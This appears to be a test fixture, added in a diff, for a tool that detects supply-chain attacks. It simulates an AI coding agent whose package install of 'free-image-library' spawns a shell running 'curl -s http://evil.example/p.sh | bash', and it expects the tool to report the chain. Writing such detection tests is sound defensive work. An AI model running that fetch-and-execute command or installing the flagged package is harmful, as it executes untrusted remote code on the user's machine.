@@ -1,0 +1,32 @@
+subjects:
+  cursor:
+    session: pid/100:1
+    program: /Applications/Cursor.app/Contents/MacOS/Cursor
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: dev-1
+    source: probe
+  python:
+    session: pid/101:1
+    parent: cursor
+    program: /usr/local/bin/python3
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  sh:
+    session: pid/102:1
+    parent: python
+    program: /bin/sh
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: cursor}
+  - {kind: spawn, subject: python, cmdline: "python3 -m pip install free-image-library"}
+  - {kind: spawn, subject: sh, cmdline: "sh -c 'curl -s http://evil.example/p.sh | bash'"}
+  - {kind: http_request, subject: sh, url: "http://evil.example/p.sh", method: GET, request_id: r1, content_type: text/plain, body: "", at_ms: 2}
+trigger: 2
+expect:
+  action: report
+  reason_contains: "PyPI supply chain — package install, reported malicious package 'free-image-library', download tool executed during package install, egress to evil.example | session: sh -> python3 -> Cursor"
+  chain_min: 3
